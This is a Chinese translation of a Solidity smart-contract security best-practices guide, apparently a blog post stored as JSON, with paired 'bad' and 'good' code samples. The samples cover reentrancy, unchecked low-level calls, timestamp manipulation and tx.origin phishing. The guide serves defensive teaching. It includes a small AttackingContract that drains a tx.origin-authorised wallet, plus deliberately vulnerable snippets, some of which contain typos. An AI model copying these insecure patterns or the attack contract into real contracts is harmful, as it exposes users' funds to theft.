中被引入，与抽象合约十分相似，但是接口不能有已经实现的方法。接口同样也有限制，它不能访问存储，不能继承其他接口，而这通常使得抽象合约更加实用。虽然，接口实际上对设计合约的实现上十分有用。另外，十分重要的是如果一个合约继承了一个抽象合约，那它必须通过重写来实现所有抽象合约中未实现的函数，否则它依旧是一个抽象合约。</p>\n<h3 id=\"保持-fallback-函数简单\"><a href=\"#保持-fallback-函数简单\" class=\"headerlink\" title=\"保持 fallback 函数简单\"></a>保持 fallback 函数简单</h3><p>当一个合约发送了没有参数（或者当没有函数匹配上的时候）的消息时，<a href=\"https://solidity.readthedocs.io/en/latest/contracts.html#fallback-function\" target=\"_blank\" rel=\"noopener\">Fallback 函数</a> 会被调用，而且如果通过 <code>.send()</code> 或者 <code>.transfer()</code> 调用的话只需要 2300 单位的燃料。如果你希望能够从 <code>.send()</code> 或者 <code>.transfer()</code> 接受以太币，你能做的就是在 fallback 函数中记录一个日志。如果需要计算，或者更多的燃料，就使用一个真正的函数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// bad</span><br><span class=\"line\">funciton() payable &#123; balances[msg.sender] += msg.value; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// good</span><br><span class=\"line\">function deposit() payable external &#123; balances[msg.sender] += msg.value; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function() payable &#123; LogDepositReceived(msg.sender); &#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"为函数和状态变量显式标记可见性\"><a href=\"#为函数和状态变量显式标记可见性\" class=\"headerlink\" title=\"为函数和状态变量显式标记可见性\"></a>为函数和状态变量显式标记可见性</h3><p>显式标记函数和状态变量的可见性。函数可以被指定为 <code>external / public / internal / private</code>。请理解它们之间的区别，比如，比起 <code>public</code>，<code>external</code> 可能已经足够使用了。对于状态变量来说，<code>external</code> 是不可能的。显式标记可见性将更容易捕捉有关谁可以调用函数或访问变量的错误假设。 </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// bad</span><br><span class=\"line\">uint x; // the default is internal for state variables, but it should be made explicit</span><br><span class=\"line\">function buy() &#123; // the default is public </span><br><span class=\"line\">\t\t// public code</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// good</span><br><span class=\"line\">uint private y;</span><br><span class=\"line\">function buy() external &#123;</span><br><span class=\"line\">\t\t// only callable external</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function utility() public &#123;</span><br><span class=\"line\">\t\t// callable externally, as well as internally: changing this code requires thinking about both cases</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function internalAction() internal &#123;</span><br><span class=\"line\">\t\t// internal code</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"锁定指定编译器版本的编译指示\"><a href=\"#锁定指定编译器版本的编译指示\" class=\"headerlink\" title=\"锁定指定编译器版本的编译指示\"></a>锁定指定编译器版本的编译指示</h3><p>应该使用相同的编译器版本部署合同，并标记它们已经经过了足够的测试。锁定编译指示可以帮助确保合约不会意外部署，比如，最新的编译器对未知错误有更高的风险。合约也可能由其他人部署，通过编译指示就知道原作者打算使用的编译器版本。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// bad </span><br><span class=\"line\">pragma solidity ^0.4.4;</span><br><span class=\"line\"></span><br><span class=\"line\">// good</span><br><span class=\"line\">pragma solidity 0.4.0;</span><br></pre></td></tr></table></figure>\n<h4 id=\"异常\"><a href=\"#异常\" class=\"headerlink\" title=\"异常\"></a>异常</h4><p>当合约打算供其他开发人员使用时，可以允许 <code>pragma</code> 语句浮动，例如类库或者 EthPM 包。否则，开发人员为了在本地编译就需要手动更新编译指示。</p>\n<h3 id=\"函数和事件的区别\"><a href=\"#函数和事件的区别\" class=\"headerlink\" title=\"函数和事件的区别\"></a>函数和事件的区别</h3><p>对事件名首字母大写,以及添加作用前缀，来防止对函数和事件产生困惑。对于方法来说，总是以小写字母开头，除了构造函数之外。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// bad </span><br><span class=\"line\">event Transfer() &#123;&#125;</span><br><span class=\"line\">function transfer() &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// good</span><br><span class=\"line\">event LogTransfer() &#123;&#125;</span><br><span class=\"line\">function transfer() external &#123;&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"推荐使用更新的-Solidity-结构\"><a href=\"#推荐使用更新的-Solidity-结构\" class=\"headerlink\" title=\"推荐使用更新的 Solidity 结构\"></a>推荐使用更新的 Solidity 结构</h3><p>使用构造/别名如 <code>selfdestruct</code> （而不是 <code>suicide</code>），和 <code>keccak256</code> （而不是 <code>sha3</code>）。<code>require(msg.sender.send(1 ether))</code> 也可以使用 <code>transfer()</code> 简单地实现： <code>msg.sender.transfer(1 ether)</code>。</p>\n<h3 id=\"注意内置函数可以被覆盖\"><a href=\"#注意内置函数可以被覆盖\" class=\"headerlink\" title=\"注意内置函数可以被覆盖\"></a>注意内置函数可以被覆盖</h3><p>目前可以在 Solidity 覆盖（<a href=\"https://en.wikipedia.org/wiki/Variable_shadowing\" target=\"_blank\" rel=\"noopener\">shadow</a>）内置的全局变量。它允许合约重写覆盖内置的方法，如 <code>msg</code> 和 <code>revert()</code>。尽管这是<a href=\"https://github.com/ethereum/solidity/issues/1249\" target=\"_blank\" rel=\"noopener\">故意</a>的，但是它可能会在关于合约的真实行为上误导合约的用户。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract PretendingToRevert &#123;</span><br><span class=\"line\">\tfunction revert() internal constant &#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ExampleContract is PretendingToRevert &#123;</span><br><span class=\"line\">\tfunction somethingBad() public &#123;</span><br><span class=\"line\">\t\trevert();</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>合约用户（和审计人员）应该注意他们想要使用的应用的所有合约源代码。</p>\n<h3 id=\"避免使用-tx-origin\"><a href=\"#避免使用-tx-origin\" class=\"headerlink\" title=\"避免使用 tx.origin\"></a>避免使用 <code>tx.origin</code></h3><p>永远不要使用 <code>tx.origin</code> 进行授权，另一个合约可以有一种方法来调用你的合约（比如用户有一些资金），而因为你的地址在 <code>tx.origin</code> 里面，你的合约就会授权该交易。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.4.18;</span><br><span class=\"line\"></span><br><span class=\"line\">contract MyContract &#123;</span><br><span class=\"line\">\taddress owner;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction MyContract() public &#123;</span><br><span class=\"line\">\t\towner = msg.sender;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction sendTo(address receiver, uint amount) public &#123;</span><br><span class=\"line\">\t\trequire(tx.origin == owner);</span><br><span class=\"line\">\t\treceiver.transfer(amount);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract AttackingContract &#123;</span><br><span class=\"line\">\tMyContract myContract;</span><br><span class=\"line\">\taddress attacker;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction AttackingContract(address myContractAddress) public &#123;</span><br><span class=\"line\">\t\tmyContract = MyContract(myContractAddress);</span><br><span class=\"line\">\t\tattacker = msg.sender;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction() public &#123;</span><br><span class=\"line\">\t\tmyContract.sendTo(attacker, msg.sender.balance);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>你应该使用 <code>msg.sender</code> 来授权（如果有另一个合约调用了你的合约，<code>msg.sender</code> 会成为合约的地址，而且不是调用合约的人的地址）。</p>\n<p>更多可见 <a href=\"https://solidity.readthedocs.io/en/develop/security-considerations.html#tx-origin\" target=\"_blank\" rel=\"noopener\">Solidity 文档</a></p>\n<p>除了授权的这个问题，<code>tx.origin</code> 可能在将来从以太坊协议中移除，所以使用了 <code>tx.origin</code> 的代码在将来不会再被兼容 <a href=\"https://ethereum.stackexchange.com/questions/196/how-do-i-make-my-dapp-serenity-proof/200#200\" target=\"_blank\" rel=\"noopener\">Vitalik: ‘Do NOT assume that tx.origin will continue to be usable or meaningful.’</a></p>\n<p>另外值得一提的是，通过使用 <code>tx.origin</code>，你会限制合同之间的互操作性，因为使用 <code>tx.origin</code> 的合同不能被另一个合同使用，因为合同不能是 <code>tx.origin</code>。</p>\n<h3 id=\"时间戳依赖\"><a href=\"#时间戳依赖\" class=\"headerlink\" title=\"时间戳依赖\"></a>时间戳依赖</h3><p>在合同中使用时间戳执行关键功能时有三个主要考虑因素，特别是当涉及到资金转移时。</p>\n<h4 id=\"Gameability\"><a href=\"#Gameability\" class=\"headerlink\" title=\"Gameability\"></a>Gameability</h4><p>注意区块的时间戳是可用被矿工操作的。考虑这个<a href=\"https://etherscan.io/address/0xcac337492149bdb66b088bf5914bedfbf78ccc18#code\" target=\"_blank\" rel=\"noopener\">合约</a>：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uint256 constant private salt = block.timestamp;</span><br><span class=\"line\"></span><br><span class=\"line\">function random(uint Max) constant private returns (uint256 result) &#123;</span><br><span class=\"line\">\t//get the best seed for randomness</span><br><span class=\"line\">\tuint256 x = salt * 100/Max;</span><br><span class=\"line\">\tuint256 y = salt * block.number/(salt % 5);</span><br><span class=\"line\">\tuint256 seed = block.number/3 + (salt % 300) + Last_Payout + y;</span><br><span class=\"line\">\tuint256 h = uint256(block.blockhash(seed));</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn uint256((h / x)) % Max + 1; // random number between 1 and Max</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当合约使用时间戳来产生随机数时，矿工实际上可以在被验证块的 30 秒内发布时间戳，从而有效地允许矿工预先计算一个更有利于他们抽奖机会的选项。 时间戳不是随机的，不应该在这种情况下使用。</p>\n<h4 id=\"30-秒规则\"><a href=\"#30-秒规则\" class=\"headerlink\" title=\"30 秒规则\"></a>30 秒规则</h4><p>评估时间戳使用的一般经验法则是：</p>\n<p><strong>如果合约功能可以容忍30秒的时间漂移，则可以安全使用 <code>block.timestamp</code></strong></p>\n<p>如果您的时间相关事件的比例可以变化 30 秒并保持完整性，则使用时间戳是安全的。 这包括拍卖结束，注册期限等事情。</p>\n<h4 id=\"将-block-number-作为时间戳使用时要当心\"><a href=\"#将-block-number-作为时间戳使用时要当心\" class=\"headerlink\" title=\"将 block.number 作为时间戳使用时要当心\"></a>将 <code>block.number</code> 作为时间戳使用时要当心</h4><p>当合约创建一个 <code>auction_complete</code> 修饰器来表示代币销售的结束，像<a href=\"https://consensys.github.io/smart-contract-best-practices/(https://github.com/SpankChain/old-sc_auction/blob/master/contracts/Auction.sol\" target=\"_blank\" rel=\"noopener\">这样</a>)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modifier auction_complete &#123;</span><br><span class=\"line\">\trequire(auctionEndBlock &lt;= block.number ||</span><br><span class=\"line\">\t\tcurrentAuctionState == AuctionState.success ||</span><br><span class=\"line\">\t\tcurrentAuctionState == AuctionState.cancel)</span><br><span class=\"line\">\t\t_;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><code>block.number</code> 和 <a href=\"https://etherscan.io/chart/blocktime\" target=\"_blank\" rel=\"noopener\">平均出块时间</a> 也可以用来估算时间，但是这不是未来的证明，因为区块时间可以修改（例如 <a href=\"https://blog.ethereum.org/2015/08/08/chain-reorganisation-depth-expectations/\" target=\"_blank\" rel=\"noopener\">分叉重组</a> 和 <a href=\"https://github.com/ethereum/EIPs/issues/649\" target=\"_blank\" rel=\"noopener\">难度炸弹</a>）。在一天的销售中，12分钟规则允许人们构建更可靠的时间估计。</p>\n<h3 id=\"弃用-历史-建议\"><a href=\"#弃用-历史-建议\" class=\"headerlink\" title=\"弃用/历史 建议\"></a>弃用/历史 建议</h3><p>由于协议的修改或者 solidity 的提升，这些建议不再相关。They are recorded here for posterity and awareness.</p>\n<h4 id=\"注意被-0-除-（Solidity-lt-0-4）\"><a href=\"#注意被-0-除-（Solidity-lt-0-4）\" class=\"headerlink\" title=\"注意被 0 除 （Solidity &lt; 0.4）\"></a>注意被 0 除 （Solidity &lt; 0.4）</h4><p>在版本 0.4 之前，当一个数字除以 0 时，Solidity 会返回零，并且不会引发异常。 确保你至少运行 0.4 版本。</p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations/\" target=\"_blank\" rel=\"noopener\">原文链接</a></p>\n<h2 id=\"对-Solidity-中的智能合约的安全推荐-Recommendations-for-Smart-Contract-Security-in-Solidity\"><a href=\"#对-Solidity-中的智能合约的安全推荐-Recommendations-for-Smart-Contract-Security-in-Solidity\" class=\"headerlink\" title=\"对 Solidity 中的智能合约的安全推荐 Recommendations for Smart Contract Security in Solidity\"></a>对 Solidity 中的智能合约的安全推荐 Recommendations for Smart Contract Security in Solidity</h2><p>本页面展示了编写智能合约时应遵循的一些 solidity 模式。</p>\n<h3 id=\"协议具体建议\"><a href=\"#协议具体建议\" class=\"headerlink\" title=\"协议具体建议\"></a>协议具体建议</h3><p>以下建议适用于以太坊中所有的智能合约的开发。</p>\n<h3 id=\"外部调用\"><a href=\"#外部调用\" class=\"headerlink\" title=\"外部调用\"></a>外部调用</h3><h4 id=\"小心使用外部调用\"><a href=\"#小心使用外部调用\" class=\"headerlink\" title=\"小心使用外部调用\"></a>小心使用外部调用</h4><p>调用不受信任的合约会引入一些预期外的风险或错误。外部调用可能会在该合约或其依赖的任何其他合约中执行恶意代码。所以每个外部调用都要被当做潜在的安全风险来对待。如果不可能或不希望删除外部调用，请使用本节其余部分的建议来减少危险</p>\n<h4 id=\"标记不受信任的合约\"><a href=\"#标记不受信任的合约\" class=\"headerlink\" title=\"标记不受信任的合约\"></a>标记不受信任的合约</h4><p>当与外部合约交互的时候，通过某种形式命名你的变量，方法和合约接口来清楚地表达其所交互的对象是具有潜在性的安全问题的。这适用于你的调用外部合约的函数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// bad</span><br><span class=\"line\">Bank.withdraw(100); // Unclear whether trusted or untrusted</span><br><span class=\"line\"></span><br><span class=\"line\">// Isn&apos;t clear that this function is potentially unsafe</span><br><span class=\"line\">function makeWithdrawal(uint amount)  &#123;</span><br><span class=\"line\">\t\tBank.withdraw(amount);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// good</span><br><span class=\"line\">UntrustedBank.withdraw(100);</span><br><span class=\"line\">TrustedBank.withdraw(100);</span><br><span class=\"line\"></span><br><span class=\"line\">function makeUntrustedWithdrawal(uint amount) &#123;</span><br><span class=\"line\">\t\tUntrustedBank.withdraw(amount);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"避免在外部调用之后改变状态\"><a href=\"#避免在外部调用之后改变状态\" class=\"headerlink\" title=\"避免在外部调用之后改变状态\"></a>避免在外部调用之后改变状态</h4><p>不论是否使用 <code>raw calls</code>（<code>someAddress,call()</code> 的格式） 或者 <code>contract calls</code>（<code>ExternalContract.someMethod()</code> 的格式），都假定会执行恶意代码。即使 <code>ExternalContract</code> 不是恶意的，但它调用的任何合约也可能会执行恶意代码。</p>\n<p>一个特殊的危险是，恶意代码可能对控制流进行了 <code>hijack</code> 攻击，导致条件竞争。（见 <a href=\"https://consensys.github.io/smart-contract-best-practices/known_attacks/#race-conditions\" target=\"_blank\" rel=\"noopener\">Race Conditions</a> 了解更多关于这个问题的讨论）。</p>\n<p>如果你调用了一个不受信任的外部合约，<em>避免在调用之后改变状态</em>。这个模式也常常作为 <a href=\"https://solidity.readthedocs.io/en/develop/security-considerations.html?highlight=check%20effects#use-the-checks-effects-interactions-pattern\" target=\"_blank\" rel=\"noopener\">check-effects-interactions 模式</a> 为人们所知。</p>\n<h4 id=\"注意-send-transfer-call-value-之间的平衡\"><a href=\"#注意-send-transfer-call-value-之间的平衡\" class=\"headerlink\" title=\"注意 send() / transfer() / call.value() 之间的平衡\"></a>注意 <code>send() / transfer() / call.value()</code> 之间的平衡</h4><p>在发送 ether 时注意 <code>someAddress.send() / someAddress.transfer() / someAddress.call.value()()</code> 之间的使用的关系的平衡。</p>\n<ul>\n<li><code>someAddress.send()</code> 和 <code>someAddress.transfer()</code> 被认为对于<a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations/#reentrancy\" target=\"_blank\" rel=\"noopener\">重入</a>是安全的。尽管这些方法仍然会触发代码的执行，但是被调用的合约只会被提供 2300 单位的燃料，目前来说，这么多的燃料足够用来记录事件了。</li>\n<li><code>x.transfer(y)</code> 和 <code>require(x.send(y));</code> 的等同的，如果发送失败，它会自动回退。</li>\n<li><code>someAddress.call.value(y)()</code> 会发送提供的以太币，然后触发代码的执行。为执行的代码提供所有可用来执行的燃料使得这种转账方式对于重入来说很不安全。</li>\n</ul>\n<p>使用 <code>send()</code> 和 <code>transfer()</code> 可以防止重入，但是这样的做法会使得与那些 fallback 函数的消耗超过 2300 单位燃料的合约不兼容。也可以使用 <code>someAddress.vall.value(ethAmount).gas(gasAmount)()</code> 来转发指定的燃料数量。</p>\n<p>一个试图平衡这个问题的解决办法是实现 <em><a href=\"https://consensys.github.io/smart-contract-best-practices/recommendations/#favor-pull-over-push-payments\" target=\"_blank\" rel=\"noopener\">退和拉</a></em> 的机制模式， <em>推送</em> 部分使用 <code>send()</code> 或者 <code>transfer()</code> ，<em>拉</em> 部分使用 <code>call.value()</code> 。</p>\n<p>值得指出的是，对于价值转移而言，专用 <code>send()</code> 或者 <code>transfer()</code> 并不能使得合约避免重入的安全问题，但是能够使得一些特定的转账避免重入的安全问题。</p>\n<h4 id=\"解决外部调用的错误\"><a href=\"#解决外部调用的错误\" class=\"headerlink\" title=\"解决外部调用的错误\"></a>解决外部调用的错误</h4><p>Solidity 提供了处理原生地址的底层调用方法：<code>address.call()</code>，<code>address.callcode()</code>，<code>address,delegatecall()</code>，和 <code>address.send()</code>。当调用遇到一个异常的时候，这些底层方法不会抛出一个异常，而是返回一个 <code>false</code>。从另一方面来说，<em>合约调用</em>（如 <code>ExternalContract.doSomething()</code>）会自动传播一个异常（比如，如果 <code>doSomething()</code> 抛出异常，<code>ExternalContract.doSomething()</code> 也会 <code>throw</code>）。</p>\n<p>如果你选择使用底层调用方法，要确定你通过检查返回值，处理了可能存在的调用失败的情况。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// bad</span><br><span class=\"line\">someAddress.send(55);</span><br><span class=\"line\">someAddress.call.value(55)(); // this is doubly dangerous, as it will forward all remaining gas and doesn&apos;t check for result</span><br><span class=\"line\">someAddress.call.value(100)(bytes4(sha3(&quot;deposit()&quot;))); // if deposit throws an exception, the raw call() will only return false and transaction will NOT be reverted</span><br><span class=\"line\"></span><br><span class=\"line\">// good</span><br><span class=\"line\">if (!someAddress.send(55)) &#123;</span><br><span class=\"line\">\t\t// some failure code</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">ExternalContract(someAddress).deposit.value(100);</span><br></pre></td></tr></table></figure>\n<h4 id=\"对外部调用来说，拉比推更好\"><a href=\"#对外部调用来说，拉比推更好\" class=\"headerlink\" title=\"对外部调用来说，拉比推更好\"></a>对外部调用来说，拉比推更好</h4><p>外部调用可能有意无意而失败。为了最小化这样失败带来的破坏，通常最好将每个外部调用隔离到可以由调用接收方发起的自己的交易中。这与支付特别相关，与将资金自动推给用户比起来，更好的是让用户提取资金。（这也减少了<a href=\"https://consensys.github.io/smart-contract-best-practices/known_attacks/#dos-with-block-gas-limit\" target=\"_blank\" rel=\"noopener\">燃料限制问题</a>。）避免在单个交易中组合多个 <code>send()</code> </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// bad</span><br><span class=\"line\">contract auction &#123;</span><br><span class=\"line\">\taddress highestBidder;</span><br><span class=\"line\">\tuint highestBid;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction bid() payable &#123;</span><br><span class=\"line\">\t\trequire(msg.value &gt;= highestBid);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tif (highestBidder != 0) &#123;</span><br><span class=\"line\">\t\t\thighestBidder.transfer(highestBid); // if this call consistently fails, no one else can bid </span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\thighestBidder = msg.sender;</span><br><span class=\"line\">\t\thighestBid = msg.value;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// good</span><br><span class=\"line\">contract auction &#123;</span><br><span class=\"line\">\taddress highestBidder;</span><br><span class=\"line\">\tuint highestBid;</span><br><span class=\"line\">\tmapping(address =&gt; uint) refunds;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction bid() payable external &#123;</span><br><span class=\"line\">\t\trequire(msg.value &gt;= highestBid);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tif (highestBidder != 0) &#123;</span><br><span class=\"line\">\t\t\trefunds[highestBidder] += highestBid; // record the refund that this user can claim</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\thighestBidder = msg.sender;</span><br><span class=\"line\">\t\thighestBid = msg.value;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfunction withdrawRefund() external &#123;</span><br><span class=\"line\">\t\tuint refund = refunds[msg.sender];</span><br><span class=\"line\">\t\trefunds[msg.sender] = 0;</span><br><span class=\"line\">\t\tmsg.sender.transfer(refund);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"不要假设合约创建时是-0-资产\"><a href=\"#不要假设合约创建时是-0-资产\" class=\"headerlink\" title=\"不要假设合约创建时是 0 资产\"></a>不要假设合约创建时是 0 资产</h4><p>一个攻击者可以在合约创建之前发送 wei 到合约的地址。合约不应该假设初始状态包含 0 资产。见 <a href=\"https://github.com/ConsenSys/smart-contract-best-practices/issues/61\" target=\"_blank\" rel=\"noopener\">问题 61</a> 查看更多细节。</p>\n<h4 id=\"记住链上的数据是公开的\"><a href=\"#记住链上的数据是公开的\" class=\"headerlink\" title=\"记住链上的数据是公开的\"></a>记住链上的数据是公开的</h4><p>许多应用程序要求提交数据以便在某个时间点可以供其工作。游戏（如链上的石头剪子布）和拍卖机制（如 盲派的第二次出价）是两种主要类别的例子。如果你正在构建一个涉及到隐私的应用，注意不免要求用户过早发布信息。</p>\n<p>示例：</p>\n<ul>\n<li>在石头剪子布中，首先要求两个玩家同时提交他们的出手意图的哈希值，然后再要求提交他们的实际出手，如果匹配不上之前的哈希值，则抛出。</li>\n<li>在一个拍卖中，要求玩家在初始阶段提交他们的出价金额的哈希值（保证金高于他们的竞价），然后在第二阶段提交他们的实际竞价。</li>\n<li>当开发一个依赖于随机数生成器的应用时，顺序应该总是（1）提交行动，（2）生成随机数，（3）玩家付出。随机数生成方法本来就是一个活跃的研究领域；目前同类最佳的解决方案包括比特币区块头（通过 <a href=\"http://btcrelay.org\" target=\"_blank\" rel=\"noopener\">http://btcrelay.org</a> 来验证），散列提交揭示方案（即一方产生一个数字，将其散列值发布为”提交“的值，然后揭示这个数）和 <a href=\"https://github.com/randao/randao\" target=\"_blank\" rel=\"noopener\">RANDAO</a></li>\n<li>如果你正在实现一个频繁的批量拍卖，哈希提交方案也很合适。</li>\n</ul>\n<h3 id=\"注意在双方或者多方合约中，一些成员可能”掉线“，没有返回\"><a href=\"#注意在双方或者多方合约中，一些成员可能”掉线“，没有返回\" class=\"headerlink\" title=\"注意在双方或者多方合约中，一些成员可能”掉线“，没有返回\"></a>注意在双方或者多方合约中，一些成员可能”掉线“，没有返回</h3><p>不要只依赖于特定方执行特定行动的退款或者索赔流程，而没有其他获得资金的方式。比如，在剪刀石头布游戏中，一个常见的错误是在两位玩家提交它们的行动之前，没有进行支付；然而，一个恶意的玩家可以简单地通过不提交他的动作来使得另一位玩家陷入困境 - 实际上，如果一个玩家看到了其他玩家暴露的行为，并且确定他们输了，他们就没有任何理由去提交他们自己的行为。这个问题也可能出现在状态渠道的解决中。当这样的场景变成一个问题，（1）提供一种规避未参与的参与者的方式，可能是通过限制时间，（2）考虑增加额外的经济激励，让参与者在需要提交信息的场景中提交所有该场景需要的信息。</p>\n<h3 